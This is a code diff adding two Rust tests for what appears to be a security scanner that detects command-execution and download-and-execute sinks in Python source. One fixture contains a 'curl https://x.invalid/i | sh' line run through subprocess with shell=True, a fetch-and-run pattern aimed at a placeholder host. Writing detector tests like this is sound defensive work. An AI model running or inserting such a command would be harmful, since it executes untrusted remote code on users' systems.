@@ -707,3 +707,33 @@ fn m1_concatenated_shell_commands_are_download_exec() {
     let e: Vec<u32> = sinks(&sigs, "exec").iter().flat_map(|s| lines(s)).collect();
     assert_eq!(e, vec![5], "{sigs:#?}");
 }
+
+// ---- Task 11 review fix round 2 (shared code) ----
+
+#[test]
+fn python_long_implicit_concat_does_not_flag_budget() {
+    let parts: String = (0..70).map(|i| format!("\"w{i} \" ")).collect();
+    let py = format!("import os\nmsg = ({parts}) + name\nos.system(\"id\")\n");
+    let sigs = run(&[("a.py", &py)]);
+    assert_eq!(sinks(&sigs, "exec").len(), 1, "{sigs:#?}");
+    assert!(
+        hidden(&sigs, "parse_budget_exceeded").is_empty(),
+        "{sigs:#?}"
+    );
+}
+
+#[test]
+fn seventeenth_alias_to_sink_module_is_kept() {
+    let mut py: String = (0..16).map(|i| format!("from m{i} import run\n")).collect();
+    py.push_str("from subprocess import run\nrun(\"curl https://x.invalid/i | sh\", shell=True)\n");
+    let sigs = run(&[("a.py", &py)]);
+    let d: Vec<u32> = sinks(&sigs, "download_exec")
+        .iter()
+        .flat_map(|s| lines(s))
+        .collect();
+    assert_eq!(d, vec![18], "{sigs:#?}");
+    assert!(
+        hidden(&sigs, "parse_budget_exceeded").is_empty(),
+        "{sigs:#?}"
+    );
+}
